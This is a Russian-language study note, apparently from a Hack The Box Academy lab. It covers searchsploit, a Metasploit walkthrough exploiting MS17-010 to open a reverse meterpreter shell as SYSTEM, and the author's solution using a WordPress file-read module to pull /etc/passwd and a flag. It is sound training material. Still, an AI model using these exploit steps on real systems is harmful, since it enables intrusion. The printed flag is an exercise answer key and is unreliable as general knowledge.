
# Public Exploits


Как только мы определим службы, работающие на портах, определенных из нашего `Nmap`При сканировании первым делом необходимо проверить, есть ли в каких-либо приложениях/службах какие-либо общедоступные эксплойты. Публичные эксплойты можно найти для веб-приложений и других приложений, работающих на открытых портах, например `SSH` или `ftp`.

---
## Finding Public Exploits

Многие инструменты могут помочь нам найти общедоступные эксплойты для различных приложений и сервисов, с которыми мы можем столкнуться на этапе перебора. Один из способов — найти в Google имя приложения с помощью `exploit` чтобы увидеть, получим ли мы какие-либо результаты:

![[Pasted image 20240804094005.png]]

Хорошо известным инструментом для этой цели является `searchsploit`, который мы можем использовать для поиска общедоступных уязвимостей/эксплойтов для любого приложения. Мы можем установить его с помощью следующей команды:

Публичные подвиги

```shell-session
Uliam@htb[/htb]$ sudo apt install exploitdb -y
```

Затем мы можем использовать `searchsploit` для поиска конкретного приложения по его названию следующим образом:

Публичные подвиги

```shell-session
Uliam@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Мы также можем использовать онлайн-базы данных эксплойтов для поиска уязвимостей, такие как [Exploit DB](https://www.exploit-db.com) , [Rapid7 DB](https://www.rapid7.com/db/) или [Vulnerability Lab](https://www.vulnerability-lab.com) . В модуле [«Введение в веб-приложения»](https://academy.hackthebox.com/module/details/75) обсуждаются общедоступные уязвимости веб-приложений.

---

## Metasploit Primer

Metasploit Framework (MSF) — отличный инструмент для пентестеров. Он содержит множество встроенных эксплойтов для многих общедоступных уязвимостей и обеспечивает простой способ использования этих эксплойтов против уязвимых целей. MSF имеет множество других функций, таких как:

- Запуск сценариев разведки для перечисления удаленных хостов и скомпрометированных целей
    
- Скрипты проверки для проверки существования уязвимости без фактического ущерба для цели.
    
- Meterpreter — отличный инструмент для подключения к оболочкам и выполнения команд на скомпрометированных целях.
    
- Множество инструментов для последующей эксплуатации и поворота
    

Давайте рассмотрим простой пример поиска эксплойта для приложения, которое мы атакуем, и способа его использования. Бежать `Metasploit`, мы можем использовать `msfconsole` команда:

Публичные подвиги

```shell-session
Uliam@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

Как только у нас есть `Metasploit` работая, мы можем найти наше целевое приложение с помощью `search exploit`команда. Например, мы можем найти уязвимость SMB, которую мы определили ранее:

Публичные подвиги

```shell-session
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
```

Совет: Поиск может применять сложные фильтры, такие как поиск cve:2009 type:exploit. Просмотреть все фильтры с помощью поиска

Мы нашли один эксплойт для этого сервиса. Мы можем использовать его, скопировав его полное имя и используя `USE` чтобы использовать его:

Публичные подвиги

```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Прежде чем мы сможем запустить эксплойт, нам необходимо настроить его параметры. Чтобы просмотреть параметры, доступные для настройки, мы можем использовать команду `show options` команда:

Публичные подвиги

```shell-session
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

Любой вариант с `Required` установлен в `yes`необходимо настроить, чтобы эксплойт работал. В этом случае у нас есть только два варианта установки: `RHOSTS`, что означает IP нашей цели (это может быть один IP, несколько IP или файл, содержащий список IP). Второй вариант, `LHOST`, представляет IP-адрес нашего атакующего хоста (это может быть один IP-адрес или имя сетевого интерфейса. В примере ниже: `LHOST` устанавливается на IP-адрес, связанный с нашим `tun0` интерфейс.) Мы можем установить их с помощью `set` команда:

Публичные подвиги

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Как только у нас будут установлены обе опции, мы сможем начать эксплуатацию. Однако прежде чем запустить скрипт, мы можем запустить проверку, чтобы убедиться в уязвимости сервера:

Публичные подвиги

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

Как мы видим, сервер действительно уязвим. Обратите внимание, что не каждый эксплойт в `Metasploit Framework` поддерживает `check`функция. Наконец, мы можем использовать `run` или `exploit` команда для запуска эксплойта:

Публичные подвиги

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

Как мы видим, мы смогли получить доступ администратора к ящику и использовали `shell`команда, чтобы поместить нас в интерактивную оболочку. Это основные примеры использования `Metasploit`использовать уязвимость на удаленном сервере. На платформе Hack The Box есть множество устаревших коробок, которые отлично подходят для практики Metasploit. Некоторые из них включают, помимо прочего:

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

Позже в этом модуле мы рассмотрим `Nibbles` box шаг за шагом, а затем покажите эксплуатацию, используя `Metasploit`. `Metasploit`— еще один важный инструмент, который следует добавить в наш набор инструментов, но важно не полагаться только на него. Чтобы быть разносторонними тестировщиками, мы должны знать, как наилучшим образом использовать все доступные нам инструменты, понимать, почему они иногда терпят неудачу, и знать, когда следует перейти к ручным методам или другим инструментам.

---
# Questions

 Попробуйте определить службы, работающие на указанном выше сервере, а затем попытайтесь найти общедоступные эксплойты для их использования. Как только вы это сделаете, попробуйте получить содержимое файла «/flag.txt». (примечание: запуск веб-сервера может занять несколько секунд)

Опять же… посмотрим, как поведет себя этот «живой» поток сознания. Итак, мы находимся на сервере Apache/2.4.41 (Ubuntu).

![[Pasted image 20240804105044.png]]

Хорошо, оказывается, я играл с Metasploit и МАССИВНО усложнял его. Глупый я... поехали!

Откройте метасплоит с помощью «msfconsole».

Когда вы заходите в браузер, вы видите страницу WordPress, на которой говорится о «[Simple Backup Plugin 2.7.10](http://94.237.53.113:40479/index.php/2021/02/11/hello-world/)». Вся суть этого была в использовании службы с использованием Metasploit (или альтернативы).

При поиске мы получаем один модуль эксплойта «auxillary/scanner/http/wp_simple_backup_file_read». Нажмите «0», так как это наш единственный способ ввести нас в этот сценарий, где мы можем установить несколько простых параметров (я сильно усложнил его).

![[Pasted image 20240804105156.png]]

```
msf6 > search wordpress simple backup file    
  
Matching Modules  
================  
  
  #  Name                                               Disclosure Date  Rank    Check  Description  
  -  ----                                               ---------------  ----    -----  -----------  
  0  auxiliary/scanner/http/wp_simple_backup_file_read                   normal  No     WordPress Simple Backup File Read Vulnerability  
  
  
Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
```

«Использовать 0», так как это наш единственный вариант, позволяющий нам «показать параметры».

![[Pasted image 20240804105337.png]]

Нам нужно установить RHOSTS и RPORT для целевого IP-адреса и порта. Затем «exploit» или «run» запускает сценарий:

![[Pasted image 20240804105407.png]]

```
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit  
  
[+] File saved in: /home/user/.msf4/loot/20240804110339_default_94.237.59.63_simplebackup.tra_243639.txt  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed  
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > cat /home/irs/.msf4/loot/20240804110339_default_94.237.59.63_simplebackup.tra_243639.txt  
[*] exec: cat /home/irs/.msf4/loot/20240804110339_default_94.237.59.63_simplebackup.tra_243639.txt  
  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false  
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:105:107::/nonexistent:/usr/sbin/nologin  
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
```

Установить путь к файлу **/flag.txt** 

«run» перемещает его в мой каталог, чтобы я мог указать путь к файлу, в котором он был сохранен.

```
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set filepath /flag.txt  
filepath => /flag.txt  
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit  
  
[+] File saved in: /home/irs/.msf4/loot/20240804110635_default_94.237.59.63_simplebackup.tra_606751.txt  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed  
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > cat /home/user/.msf4/loot/20240804110635_default_94.237.59.63_simplebackup.tra_606751.txt  
[*] exec: cat /home/irs/.msf4/loot/20240804110635_default_94.237.59.63_simplebackup.tra_606751.txt  
  
HTB{my_f1r57_h4ck}  
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) >
```

![[Pasted image 20240804111025.png]]

Да, так что это было намного проще, чем я думал. Я пытался найти случайные службы и порты, которые были открыты. Дурак я.


